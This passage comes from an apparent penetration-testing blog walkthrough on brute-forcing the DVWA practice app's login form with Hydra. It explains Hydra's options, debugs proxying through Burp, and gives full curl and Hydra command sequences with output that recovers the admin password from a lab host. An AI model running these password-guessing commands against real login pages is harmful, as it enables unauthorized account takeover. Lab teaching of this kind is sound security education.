&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;VERBOSE&lt;span class="o"&gt;]&lt;/span&gt; Resolving addresses ... &lt;span class="k"&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.44 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;1&lt;/span&gt; of &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 0&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;80&lt;span class="o"&gt;][&lt;/span&gt;http-get-form&lt;span class="o"&gt;]&lt;/span&gt; host: 192.168.1.44   login: admin   password: admin
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;STATUS&lt;span class="o"&gt;]&lt;/span&gt; attack finished &lt;span class="k"&gt;for&lt;/span&gt; 192.168.1.44 &lt;span class="o"&gt;(&lt;/span&gt;valid pair found&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="m"&gt;1&lt;/span&gt; of &lt;span class="m"&gt;1&lt;/span&gt; target successfully completed, &lt;span class="m"&gt;1&lt;/span&gt; valid password found
&lt;/span&gt;&lt;span class="line"&gt;Hydra &lt;span class="o"&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class="o"&gt;)&lt;/span&gt; finished at 2015-10-22 21:56:22
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Debugging Hydra with Burp Proxy" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-08.png" /&gt;&lt;/p&gt;

&lt;p&gt;Let's break down the lines:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;rm -f hydra.restore;&lt;/code&gt; - when you break from Hydra before the brute force attack is complete, it will automatically create a session file, allowing you to restore. We do not want that now.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;export HYDRA_PROXY_HTTP=http://127.0.0.1:8080&lt;/code&gt; - this is a bash variable that instructs Hydra to use a proxy.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hydra&lt;/code&gt; - the main program itself&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-l admin&lt;/code&gt; - a single static username, &lt;code&gt;admin&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-p password&lt;/code&gt; - a single static username, &lt;code&gt;password&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-e ns&lt;/code&gt; - try a "null" password for the user &amp;amp; "same" username as password&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-F&lt;/code&gt; - quit after logging in successfully&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-t 1&lt;/code&gt; - single thread&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-w 5&lt;/code&gt; - timeout value of 5 seconds&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-W 1&lt;/code&gt; - wait 1 second before going on to the next thread&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-v&lt;/code&gt; - enable verbose&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-V&lt;/code&gt; - show login attempts (will print out username and password combinations)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;192.168.1.44&lt;/code&gt; - the target IP&lt;/li&gt;
&lt;li&gt;&lt;code&gt;http-get-form&lt;/code&gt; - the module to use for the method of the attack&lt;/li&gt;
&lt;li&gt;&lt;code&gt;"/DVWA/vulnerabilities/brute/&lt;/code&gt; - the path to the web form to target&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login&lt;/code&gt; - how to use the wordlists in the request.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:F=Username and/or password incorrect.&lt;/code&gt; - Failed logins will contain the following string (aka blacklisting)

&lt;ul&gt;
&lt;li&gt;If we wanted to use the page length instead: &lt;code&gt;:F=Content-Length\: 4945&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:H=Cookie\: security=low; PHPSESSID=${SESSIONID}"&lt;/code&gt; - the cookie information to send.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Becuase we are debugging, the thread count is set to 1, using a larger timeout value as well as to wait after each thread finishes. This is because, when there are multiple requests being made without any delay, it makes it harder managed and to track Hydra's progress inside of Burp.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Note, if we are going to use Burp, make sure "Invisible Proxy Mode" is enabled (see below)!&lt;/em&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Burp.s.Invisible.Proxy.Mode"&gt;&lt;/a&gt;
&lt;h3&gt;Burp's Invisible Proxy Mode&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;: Enable Burp's "Invisible Proxy Mode" when using Hydra.&lt;/p&gt;

&lt;p&gt;&amp;lt;rambles&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;I noticed when I made the first request, Burp did not detect any &lt;strong&gt;GET parameters in the URL&lt;/strong&gt;. They were missing (e.g. &lt;code&gt;?username=...&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Checking the web logs on the target&lt;/strong&gt;, I saw that the parameters were definitely not making it to the target's web server.&lt;/li&gt;
&lt;li&gt;As I could see the combinations attempts (&lt;code&gt;-V&lt;/code&gt;), &lt;strong&gt;Hydra believes that it was sending out the correct combinations&lt;/strong&gt;. So the next option was using the debug command, &lt;code&gt;-d&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Missing Parameters" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-09.png" /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;After &lt;strong&gt;sifting through the debug data&lt;/strong&gt;, Hydra itself was reporting that it successfully sent out the URL with the GET parameters. &lt;strong&gt;This meant there was an issue between Hydra and the proxy/Burp&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Disabling the proxy&lt;/strong&gt; usage, and switching to &lt;code&gt;wireshark&lt;/code&gt; to monitor the traffic, this time, the &lt;strong&gt;traffic appeared to be correct&lt;/strong&gt;. This was &lt;strong&gt;confirmed by the web server logs&lt;/strong&gt;!&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Wireshark" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-10.png" /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Re-enabling the proxy, but this time &lt;strong&gt;switching to &lt;a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project"&gt;OWASP Zed Attack Proxy&lt;/a&gt; (instead of Burp) was also working&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;After contact Burp support, &lt;a href="https://support.portswigger.net/customer/portal/questions/14312525-hydra-http-get-form-burp-missing-get-parameters"&gt;they suggested&lt;/a&gt; to &lt;strong&gt;look at the "alert tab"&lt;/strong&gt; and report back anything displayed there. This contained a key bit of information, which led to the fix. Oops!&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="alert tab" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-11.png" /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Now, I &lt;strong&gt;changed the mode of the proxy type to be "Invisible"&lt;/strong&gt;. See here for more information about &lt;a href="https://portswigger.net/burp/help/proxy_options_invisible.html"&gt;Invisible Proxying&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Invisible mode" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-12.png" /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;The result is successful&lt;/strong&gt;! Both Burp and the web logs now show the valid GET parameters!&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Burp Hydra Successful Attack" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-13.png" /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Please note, &lt;code&gt;S=INCORRECT_VALUE&lt;/code&gt; was used, rather than &lt;code&gt;F=Username and/or password incorrect.&lt;/code&gt; as I wanted Hydra to &lt;strong&gt;guarantee not to find a valid login&lt;/strong&gt;. If &lt;code&gt;F=...&lt;/code&gt; was used, because the page would not contain the value (due to Invisible Proxy Mode not being enabled), Hydra assumed it got it right, on the first attempt.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&amp;lt;/rambles&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Summary&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;There are &lt;strong&gt;three solutions&lt;/strong&gt; for this:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Do not use a proxy with Hydra (&lt;code&gt;unset HYDRA_PROXY_HTTP&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;Use a different proxy &lt;em&gt;(&lt;a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project"&gt;OWASP ZAP&lt;/a&gt; works out of the box)&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;Enable "invisible proxy mode" when using in Burp as a proxy.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;So now it is time to start the attack.&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="L.strong.Hydra.Attack.Command..strong."&gt;&lt;/a&gt;
&lt;h3&gt;&lt;strong&gt;Hydra Attack Command&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;The top code snippet, will brute force &lt;strong&gt;a single user&lt;/strong&gt;, the &lt;code&gt;admin&lt;/code&gt; user and then &lt;strong&gt;stop the attack when the user is found&lt;/strong&gt; (&lt;code&gt;-F&lt;/code&gt;). It will also &lt;strong&gt;show all combination attempts&lt;/strong&gt; (&lt;code&gt;-V&lt;/code&gt;) as well as &lt;strong&gt;blacklisting a certain phrase&lt;/strong&gt; (a successful login will NOT contain this value).&lt;/p&gt;

&lt;p&gt;The bottom one will brute force &lt;strong&gt;all five users&lt;/strong&gt; (which are thereby default in DVWA), but will take much longer (as there are &lt;strong&gt;many more combinations to try&lt;/strong&gt;). A &lt;strong&gt;different wordlist is used&lt;/strong&gt; (both for usernames and passwords) and &lt;strong&gt;higher threads &amp;amp; timeout values&lt;/strong&gt;. It will also &lt;strong&gt;not display combination attempts&lt;/strong&gt; (missing &lt;code&gt;-V&lt;/code&gt;). Rather than looking for a page that does not include a certain value, this time &lt;strong&gt;look for a certain phrase once we are logged in&lt;/strong&gt; (whitelisting). More about blacklisting vs whitelisting at the end.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Single User - admin&lt;/strong&gt;&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;span class="line-number"&gt;25&lt;/span&gt;
&lt;span class="line-number"&gt;26&lt;/span&gt;
&lt;span class="line-number"&gt;27&lt;/span&gt;
&lt;span class="line-number"&gt;28&lt;/span&gt;
&lt;span class="line-number"&gt;29&lt;/span&gt;
&lt;span class="line-number"&gt;30&lt;/span&gt;
&lt;span class="line-number"&gt;31&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# unset HYDRA_PROXY_HTTP; rm -f hydra.restore&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# CSRF=$(curl -s -c dvwa.cookie 'http://192.168.1.44/DVWA/login.php' | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;'&amp;quot; -f2)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b dvwa.cookie -d &amp;quot;username=admin&amp;amp;password=password&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot; &amp;quot;http://192.168.1.44/DVWA/login.php&amp;quot; &amp;gt;/dev/null&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# time  hydra  -l admin  -P /usr/share/seclists/Passwords/rockyou.txt \&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -e ns  -F  -u  -t &lt;span class="m"&gt;5&lt;/span&gt;  -w &lt;span class="m"&gt;15&lt;/span&gt;  -v  -V  192.168.1.44  http-get-form &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="s2"&gt;&amp;quot;/DVWA/vulnerabilities/brute/:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:F=Username and/or password incorrect.:H=Cookie\: security=low; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;Hydra v8.1 &lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;2014&lt;/span&gt; by van Hauser/THC - Please &lt;span class="k"&gt;do&lt;/span&gt; not use in military or secret service organizations, or &lt;span class="k"&gt;for&lt;/span&gt; illegal purposes.
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;Hydra &lt;span class="o"&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class="o"&gt;)&lt;/span&gt; starting at 2015-10-22 22:19:36
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;INFORMATION&lt;span class="o"&gt;]&lt;/span&gt; escape sequence &lt;span class="se"&gt;\:&lt;/span&gt; detected in module option, no parameter verification is performed.
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;DATA&lt;span class="o"&gt;]&lt;/span&gt; max &lt;span class="m"&gt;5&lt;/span&gt; tasks per &lt;span class="m"&gt;1&lt;/span&gt; server, overall &lt;span class="m"&gt;64&lt;/span&gt; tasks, &lt;span class="m"&gt;14344400&lt;/span&gt; login tries &lt;span class="o"&gt;(&lt;/span&gt;l:1/p:14344400&lt;span class="o"&gt;)&lt;/span&gt;, ~44826 tries per task
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;DATA&lt;span class="o"&gt;]&lt;/span&gt; attacking service http-get-form on port 80
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;VERBOSE&lt;span class="o"&gt;]&lt;/span&gt; Resolving addresses ... &lt;span class="k"&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.44 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;1&lt;/span&gt; of &lt;span class="m"&gt;14344400&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 0&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.44 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;2&lt;/span&gt; of &lt;span class="m"&gt;14344400&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 1&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.44 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;123456&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;3&lt;/span&gt; of &lt;span class="m"&gt;14344400&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 2&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.44 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;12345&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;4&lt;/span&gt; of &lt;span class="m"&gt;14344400&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 3&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.44 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;123456789&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;5&lt;/span&gt; of &lt;span class="m"&gt;14344400&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 4&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.44 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;6&lt;/span&gt; of &lt;span class="m"&gt;14344400&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 0&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.44 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;iloveyou&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;7&lt;/span&gt; of &lt;span class="m"&gt;14344400&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 1&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.44 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;princess&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;8&lt;/span&gt; of &lt;span class="m"&gt;14344400&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 2&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.44 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;1234567&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;9&lt;/span&gt; of &lt;span class="m"&gt;14344400&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 3&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.44 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;rockyou&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;10&lt;/span&gt; of &lt;span class="m"&gt;14344400&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 4&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;80&lt;span class="o"&gt;][&lt;/span&gt;http-get-form&lt;span class="o"&gt;]&lt;/span&gt; host: 192.168.1.44   login: admin   password: password
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;STATUS&lt;span class="o"&gt;]&lt;/span&gt; attack finished &lt;span class="k"&gt;for&lt;/span&gt; 192.168.1.44 &lt;span class="o"&gt;(&lt;/span&gt;valid pair found&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="m"&gt;1&lt;/span&gt; of &lt;span class="m"&gt;1&lt;/span&gt; target successfully completed, &lt;span class="m"&gt;1&lt;/span&gt; valid password found
&lt;/span&gt;&lt;span class="line"&gt;Hydra &lt;span class="o"&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class="o"&gt;)&lt;/span&gt; finished at 2015-10-22 22:19:38
&lt;/span&gt;&lt;span class="line"&gt;hydra -l admin -P /usr/share/seclists/Passwords/rockyou.txt -e ns -F -u -t &lt;span class="m"&gt;5&lt;/span&gt;   1.44s user 0.29s system 69% cpu 2.482 total
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Hydra Attack Command" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-14.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Multiple Users&lt;/strong&gt;&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;span class="line-number"&gt;25&lt;/span&gt;
&lt;span class="line-number"&gt;26&lt;/span&gt;
&lt;span class="line-number"&gt;27&lt;/span&gt;
&lt;span class="line-number"&gt;28&lt;/span&gt;
&lt;span class="line-number"&gt;29&lt;/span&gt;
&lt;span class="line-number"&gt;30&lt;/span&gt;
&lt;span class="line-number"&gt;31&lt;/span&gt;
&lt;span class="line-number"&gt;32&lt;/span&gt;
&lt;span class="line-number"&gt;33&lt;/span&gt;
&lt;span class="line-number"&gt;34&lt;/span&gt;
&lt;span class="line-number"&gt;35&lt;/span&gt;
&lt;span class="line-number"&gt;36&lt;/span&gt;
&lt;span class="line-number"&gt;37&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# unset HYDRA_PROXY_HTTP; rm -f hydra.restore&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# CSRF=$(curl -s -c dvwa.cookie 'http://192.168.1.44/DVWA/login.php' | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;'&amp;quot; -f2)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b dvwa.cookie -d &amp;quot;username=admin&amp;amp;password=password&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot; &amp;quot;http://192.168.1.44/DVWA/login.php&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Document Moved&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Object Moved&amp;lt;/h1&amp;gt;This document may be found &amp;lt;a &lt;span class="nv"&gt;HREF&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt;&amp;gt;here&amp;lt;/a&amp;gt;&amp;lt;/body&amp;gt;#
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# cat &amp;lt;&amp;lt;EOF &amp;gt; /root/users.txt&lt;/span&gt;
